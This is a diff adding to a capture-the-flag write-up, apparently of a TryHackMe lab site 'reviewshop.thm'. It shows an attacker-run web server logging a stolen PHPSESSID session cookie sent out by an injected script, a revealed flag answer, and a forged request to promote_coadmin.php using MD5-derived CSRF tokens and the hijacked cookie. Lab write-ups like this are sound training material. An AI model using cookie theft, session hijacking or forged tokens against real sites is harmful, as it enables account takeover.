@@ -167,8 +167,72 @@ lottery.php(S60u}f5j)
 
 
 
+<img width="1060" height="524" alt="image" src="https://github.com/user-attachments/assets/1d2b7c20-cd75-458a-b948-ec8201690f15" />
 
 
+
+~/Sequence# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /testing.js HTTP/1.1" 200 -
+10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /?cookie=PHPSESSID=dg55qdecrcaibv591scv5j0ael HTTP/1.1" 200 -
+
+
+<img width="697" height="138" alt="image" src="https://github.com/user-attachments/assets/1ad3df60-a7e3-4033-bb17-287476101849" />
+
+
+<img width="957" height="407" alt="image" src="https://github.com/user-attachments/assets/d4849f9a-2e2d-4672-9497-16d7e60cf07f" />
+
+
+
+
+<p>1.1. What is the flag value after logging in as <strong>mod</strong?<br>
+        <code></code>THM{M0dH@ck3dPawned007}</p>code></p>
+
+
+<img width="1118" height="333" alt="image" src="https://github.com/user-attachments/assets/c59001e2-4c41-4ab4-9ef1-54af88a65148" />
+
+<img width="952" height="629" alt="image" src="https://github.com/user-attachments/assets/0d2c5e81-e1b9-428f-8a21-3a1bfa13d122" />
+
+MD5
+
+<img width="1353" height="258" alt="image" src="https://github.com/user-attachments/assets/bc2c5c66-cc9f-43b1-857a-84b9002bf35d" />
+
+
+
+<img width="951" height="620" alt="image" src="https://github.com/user-attachments/assets/1059c46b-860c-4bd6-82ab-7bf8c85711d2" />
+
+
+GET /promote_coadmin.php?username=ad148a3ca8bd0ef3b48c52454c493ec5&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3 HTTP/1.1
+Host: reviewshop.thm
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://reviewshop.thm/settings.php
+Connection: keep-alive
+Cookie: PHPSESSID=dg55qdecrcaibv591scv5j0ael
+Priority: u=0
+
+
+HTTP/1.1 200 OK
+Date: Tue, 23 Sep 2025 19:42:24 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 90
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<div class='alert alert-danger'>This feature is currently only available for admins.</div>
+
+
+
+        <img width="961" height="412" alt="image" src="https://github.com/user-attachments/assets/8acab50e-978e-475a-8dd3-664204b39b92" />
+
+<img width="955" height="623" alt="image" src="https://github.com/user-attachments/assets/0c75661f-d026-4e74-a7cb-74907e0c14cd" />
 
 
 
